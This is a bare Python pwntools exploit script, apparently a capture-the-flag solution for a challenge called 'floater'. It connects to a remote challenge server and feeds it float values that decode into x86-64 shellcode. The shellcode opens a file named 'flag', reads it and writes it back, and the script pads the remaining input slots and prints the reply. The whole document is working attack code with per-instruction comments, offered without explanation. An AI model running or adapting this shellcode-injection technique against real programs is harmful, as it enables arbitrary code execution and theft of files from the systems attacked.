from pwn import *
import struct

payload = ""
cnt = 0
f = lambda x : struct.unpack('!f',x)[0]

s = remote("floater_f128edcd6c7ecd2ceac15235749c1565.quals.shallweplayaga.me",754)
#s = process("/root/mfloater")

raw_input("wait")
s.sendline(str(f("\x54\x6a\x50\x68"[::-1]))) #push rbp, push 0x50, push 0
cnt += 1
s.sendline(str(f("\x58\x5a\x5e\x68"[::-1]))) #pop rax, pop rdx, pop rsi, push 0
cnt += 1
s.sendline(str(f("\x5f\x0f\x05\x68"[::-1]))) #pop rdi, syscall, push 0
cnt += 1
s.sendline(str(f("\x6a\x02\x58\x68"[::-1]))) #push 2, pop rax, push 0
cnt += 1
s.sendline(str(f("\x5e\x5e\x90\x68"[::-1]))) #pop rsi, pop rsi, nop, push 0
cnt += 1
s.sendline(str(f("\x5e\x54\x5f\x68"[::-1]))) #pop rsi, push rsp, pop rdi, push 0
cnt += 1
s.sendline(str(f("\x5a\x0f\x05\x68"[::-1]))) #pop rdx, syscall, push 0
cnt += 1
s.sendline(str(f("\x50\x5f\x90\x68"[::-1]))) #push rax, pop rdi, nop, push 0
cnt += 1
s.sendline(str(f("\x54\x6a\x50\x68"[::-1]))) #push rsp, push 0x50, push 0
cnt += 1
s.sendline(str(f("\x58\x5a\x5e\x68"[::-1]))) #pop rax, pop rdx, pop rsi. push 0
cnt += 1
s.sendline(str(f("\x0f\x05\x54\x68"[::-1]))) #syscall, push rsp, push 0
cnt += 1
s.sendline(str(f("\x58\x5e\x90\x68"[::-1]))) #pop rax, pop rsi, nop, push 0
cnt += 1
s.sendline(str(f("\xff\xc0\x90\x68"[::-1]))) #inc eax, nop, push 0
cnt += 1
s.sendline(str(f("\x6a\x50\x5a\x68"[::-1]))) #push 0x50, pop rdx, push 0
cnt += 1
s.sendline(str(f("\x5f\xff\xc7\x68"[::-1]))) #pop rdi, inc edi, push 0
cnt += 1
s.sendline(str(f("\x0f\x05\x90\x68"[::-1]))) #syscall, nop, push 0
cnt += 1


for i in range(25-cnt):
	s.sendline("1.123")

s.sendline("flag\x00")
print s.recv(1024)
raw_input("wait")